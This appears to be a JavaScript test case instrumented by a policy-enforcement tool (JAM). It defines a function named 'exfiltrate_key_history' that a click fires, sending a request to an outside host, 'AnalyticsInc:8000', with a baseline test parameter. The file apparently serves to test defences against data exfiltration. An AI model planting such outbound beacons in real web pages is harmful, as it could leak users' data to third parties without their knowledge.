function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  JAM.call(xmlhttp.open, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=baseline", true], JAM.policy.pA98284F1B24AB1A68B0D2C69F6BD9F95DCC86019D4CAEEA06E90AF66C88F54F9FF2AD259E26AC4F8C6BD08F4643AFC435CEA3BC1F2234D4283B1AEE12C038881DBFB530F3490FD3C71D2445C3035B17E31BC9645E07FAA4E7F8A6E0AF32E553DEE067EB73B18BCC4F74ADDDD41BED8B94FFBF9B28F38F8A62D71FF9A19D8DAA05734537599A07057D068244DB47EA563428BC92F9D53E780E695E189275DCE11);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE12C038881DBFB530F3490FD3C71D2445C3035B17E31BC9645E07FAA4E7F8A6E0AF32E553DEE067EB73B18BCC4F74ADDDD41BED8B94FFBF9B28F38F8A62D71FF9A19D8DAA05734537599A07057D068244DB47EA563428BC92F9D53E780E695E189275DCE11);
  return
}
JAM.set(JAM.call(document.getElementById, document, ["test"], JAM.policy.pA98284F1B24AB1A68B0D2C69F6BD9F95DCC86019D4CAEEA06E90AF66C88F54F9FF2AD259E26AC4F8C6BD08F4643AFC435CEA3BC1F2234D4283B1AEE12C038881DBFB530F3490FD3C71D2445C3035B17E31BC9645E07FAA4E7F8A6E0AF32E553DEE067EB73B18BCC4F74ADDDD41BED8B94FFBF9B28F38F8A62D71FF9A19D8DAA05734537599A07057D068244DB47EA563428BC92F9D53E780E695E189275DCE11), "onclick", exfiltrate_key_history);

